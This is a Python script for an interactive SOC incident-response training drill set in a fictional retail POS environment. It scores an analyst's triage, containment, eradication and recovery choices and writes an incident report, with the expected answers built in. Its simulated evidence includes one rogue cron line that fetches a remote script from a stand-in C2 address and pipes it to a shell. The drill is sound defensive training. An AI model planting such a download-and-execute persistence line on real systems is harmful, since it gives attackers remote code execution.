#!/usr/bin/env python3
"""
RetailPOS-Lab SOC Triage & PICERL Incident Response Drill (Zero-dependency, 0 MB VRAM)
Models:
  - Identification: True Positive vs. False Positive / Benign Burst triage
  - Containment: Evidence preservation (SHA-256) before state mutation
  - Eradication: Killing coupled root cause (process + cron + token rotation)
  - Recovery & Lessons Learned: Clean redeploy + PCI/SOC 2 incident report
"""

import hashlib
import json
from datetime import datetime, timezone
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
ALERTS_PATH = BASE_DIR.parent / "data" / "retailpos_alerts.json"
ARTIFACTS_DIR = (BASE_DIR.parent if BASE_DIR.name == "shifts" else BASE_DIR) / "artifacts"


def banner(text: str) -> None:
    print("\n" + "=" * 68)
    print(f"  {text}")
    print("=" * 68)


CLASSIFICATION_LABELS = {
    "1": "Benign / False Positive",
    "2": "Credential Stuffing",
    "3": "Container Compromise",
}


def build_siem_triage_summary(
    classifications: dict[str, str],
    c_choice: str,
    e_choice: str,
    r_choice: str,
) -> list[str]:
    """Generate an honest Triage Summary reflecting the analyst's actual choices."""
    alt101_cls = CLASSIFICATION_LABELS.get(classifications.get("ALT-101", ""), "Unclassified")
    alt102_cls = CLASSIFICATION_LABELS.get(classifications.get("ALT-102", ""), "Unclassified")
    alt103_cls = CLASSIFICATION_LABELS.get(classifications.get("ALT-103", ""), "Unclassified")

    if c_choice == "2":
        alt101_outcome = "Blocked at WAF edge."
    elif c_choice == "3":
        alt101_outcome = "Blocked at WAF edge (as part of over-broad rule that also blocked Store #412)."
    else:
        alt101_outcome = "Not blocked at WAF edge during containment."

    alt102_parts: list[str] = []
    if c_choice == "2":
        alt102_parts.append("isolated & evidence payload SHA-256 recorded")
    elif c_choice == "1":
        alt102_parts.append("restarted prematurely (no evidence hash recorded, egress left open)")
    else:
        alt102_parts.append("not isolated cleanly during containment")

    if e_choice == "2":
        alt102_parts.append("persistence removed & tokens rotated")
    else:
        alt102_parts.append("partial cleanup only (stolen tokens left active)")

    if r_choice == "1":
        alt102_parts.append("redeployed immutable")
    else:
        alt102_parts.append("runtime left unhardened (replicas scaled without PSS/readOnlyRootFilesystem)")

    if c_choice == "3" or classifications.get("ALT-103") in {"2", "3"}:
        alt103_outcome = "COLLATERAL IMPACT — legitimate Store #412 lunch-rush POS traffic disrupted or misclassified."
    else:
        alt103_outcome = "Preserved (no disruption to Store #412 lunch-rush POS traffic)."

    return [
        f"- `ALT-101` (`198.51.100.44`): Classified as *{alt101_cls}* -> {alt101_outcome}",
        f"- `ALT-102` (`order-worker-02`): Classified as *{alt102_cls}* -> {'; '.join(alt102_parts)}.",
        f"- `ALT-103` (`192.0.2.15`): Classified as *{alt103_cls}* -> {alt103_outcome}",
    ]


def run_drill() -> None:
    if not ALERTS_PATH.exists():
        raise FileNotFoundError(f"Missing alerts fixture: {ALERTS_PATH}")

    alerts = json.loads(ALERTS_PATH.read_text(encoding="utf-8"))
    ARTIFACTS_DIR.mkdir(parents=True, exist_ok=True)

    score = 0
    max_score = 100
    timeline = []
    custody_records = []

    banner("RETAILPOS SOC DESK — SHIFT TRIAGE (12:14 PM LUNCH RUSH)")
    print("Incoming SIEM/EDR Queue:\n")
    for a in alerts:
        print(f"[{a['id']}] Source={a['source']}")
        for k, v in a.items():
            if k not in {"id", "source", "verdict", "safe_action"}:
                print(f"    {k}: {v}")
        print()

    # PHASE 1: IDENTIFICATION (40 pts)
    banner("PHASE 1: IDENTIFICATION (Triage True vs. False Positives)")
    print("Classify each alert before taking action:")
    print("  1 = False Positive / Benign Traffic (Leave untouched)")
    print("  2 = True Positive — Credential Stuffing (Rate-limit / Block IP)")
    print("  3 = Critical True Positive — Container Compromise (Isolate & Forensics)\n")

    expected_class = {"ALT-101": "2", "ALT-102": "3", "ALT-103": "1"}
    classifications: dict[str, str] = {}
    for a in alerts:
        ans = input(f"Classification for {a['id']} [1/2/3]: ").strip()
        classifications[a["id"]] = ans
        if ans == expected_class[a["id"]]:
            print(f"  [+] Correct: {a['verdict']}")
            score += 13 if a["id"] != "ALT-102" else 14
            timeline.append(f"IDENTIFY {a['id']}: Classified as {a['verdict']}")
        else:
            if a["id"] == "ALT-103" and ans in {"2", "3"}:
                print("  [!] COLLATERAL DAMAGE: You blocked Store #412's live lunch-rush POS!")
            else:
                print(f"  [-] Misclassified {a['id']} (Expected {expected_class[a['id']]})")
            timeline.append(f"IDENTIFY {a['id']}: Suboptimal triage choice ({ans})")

    # PHASE 2: CONTAINMENT & EVIDENCE PRESERVATION (25 pts)
    banner("PHASE 2: CONTAINMENT (Order Matters — Custody First)")
    print("ALT-102 shows active persistence on 'order-worker-02'.")
    print("Which sequence do you execute first?")
    print("  1 = Immediately delete /etc/cron.d/telemetry-sync and restart pod")
    print("  2 = Apply deny-all NetworkPolicy to pod, snapshot & SHA-256 hash evidence, block 198.51.100.44")
    print("  3 = Block both 198.51.100.44 and 192.0.2.15 at the WAF edge")
    c_choice = input("\nSelect Containment action [1/2/3]: ").strip()

    if c_choice == "2":
        print("  [+] Blast radius contained AND forensic state preserved.")
        score += 25
        evidence_blob = json.dumps(
            {
                "host": "order-worker-02",
                "rogue_cron": "* * * * * root curl -s http://203.0.113.99/update.sh | sh",
                "attacker_ip": "198.51.100.44",
                "c2_ip": "203.0.113.99",
            },
            sort_keys=True,
        ).encode("utf-8")
        digest = hashlib.sha256(evidence_blob).hexdigest()
        custody_records.append(
            {
                "artifact": "order-worker-02 simulated evidence payload (in-memory; no separate snapshot file saved)",
                "sha256": digest,
            }
        )
        print(f"  [+] Custody SHA-256 recorded: {digest[:24]}...")
        timeline.append(f"CONTAIN: Isolated order-worker-02, blocked 198.51.100.44, SHA-256={digest}")
    elif c_choice == "1":
        print("  [!] Evidence destroyed before capture, and pod network egress is still open!")
        score += 5
        timeline.append("CONTAIN: Premature restart without forensic snapshot")
    else:
        print("  [!] Collateral outage on Store #412 POS traffic!")
        timeline.append("CONTAIN: Over-broad WAF block caused POS outage")

    # PHASE 3: ERADICATION (20 pts)
    banner("PHASE 3: ERADICATION (Kill Coupled Root Cause)")
    print("How do you ensure the attacker cannot respawn on 'order-worker-02'?")
    print("  1 = Delete /etc/cron.d/telemetry-sync only")
    print("  2 = Kill process, remove cron, rotate mounted API/SA tokens, and patch vulnerable debug route")
    e_choice = input("\nSelect Eradication action [1/2]: ").strip()

    if e_choice == "2":
        print("  [+] Coupled root cause eliminated (persistence + credentials + entry vector).")
        score += 20
        timeline.append("ERADICATE: Removed persistence, rotated secrets, patched entry vector")
    else:
        print("  [!] RESPAWN TRAP: Attacker re-enters using stolen ServiceAccount token!")
        timeline.append("ERADICATE: Partial cleanup left stolen credentials active")

    # PHASE 4: RECOVERY & LESSONS LEARNED (15 pts)
    banner("PHASE 4: RECOVERY & HARDENING (PCI DSS / SOC 2 Closure)")
    print("Which deployment hardening control prevents container filesystem persistence permanently?")
    print("  1 = readOnlyRootFilesystem: true + automountServiceAccountToken: false + egress NetworkPolicy")
    print("  2 = Increase container replica count from 2 to 4")
    r_choice = input("\nSelect Recovery control [1/2]: ").strip()

    if r_choice == "1":
        print("  [+] Immutable runtime enforced. Zero anomalies over 30-minute burn-in.")
        score += 15
        timeline.append("RECOVER: Redeployed immutable pod (readOnlyRootFilesystem + no SA token)")
    else:
        print("  [-] Scaling replicas does not stop RCE or cron writes.")
        timeline.append("RECOVER: Scaled replicas without hardening runtime")

    # GENERATE CUSTODY-HASHED INCIDENT REPORT (FIXED FILENAME, OVERWRITES ON COMPLETION)
    ts = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    report_path = ARTIFACTS_DIR / "SIEM_REPORT.md"
    report_lines = [
        f"# Incident Report — RetailPOS-Lab Checkout Anomaly ({ts})",
        "",
        f"- **Analyst Score:** `{score}/{max_score}`",
        "- **Frameworks:** SANS PICERL Operational Lifecycle / NIST SP 800-61r3 (CSF 2.0 Detect-Respond-Recover)",
        "- **Compliance Scope:** PCI DSS / SOC 2",
        "",
        "## Triage Summary",
        *build_siem_triage_summary(classifications, c_choice, e_choice, r_choice),
        "",
        "## Chain of Custody (SHA-256)",
    ]
    if custody_records:
        for rec in custody_records:
            report_lines.append(f"- {rec['artifact']}: `{rec['sha256']}`")
    else:
        report_lines.append("- *No evidence payload hash recorded during drill.*")

    report_lines.extend(["", "## Action Timeline"] + [f"- {step}" for step in timeline])
    report_path.write_text("\n".join(report_lines) + "\n", encoding="utf-8")

    banner(f"DRILL COMPLETE — SCORE: {score}/{max_score}")
    print(f"Incident report saved to: {report_path}\n")


if __name__ == "__main__":
    run_drill()
